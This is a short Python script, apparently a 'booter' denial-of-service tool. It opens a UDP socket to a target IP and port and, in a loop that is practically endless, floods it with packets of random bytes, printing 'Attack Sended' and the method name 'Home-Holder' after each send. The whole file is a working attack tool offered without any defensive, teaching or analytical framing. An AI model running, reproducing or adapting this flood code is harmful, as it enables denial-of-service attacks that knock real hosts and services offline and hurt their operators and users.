import sys,socket,colorama,time
from colorama import Fore,init
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
def booter(ip,port):
    import random
    

    s.connect((ip, port))
    for i in range(100, 1000**10000):
        s.send(random._urandom(10)*1000)
        print(f'[*] Attack Sended. <IP: {ip} > <Port:{port}> <method: Home-Holder>')
        

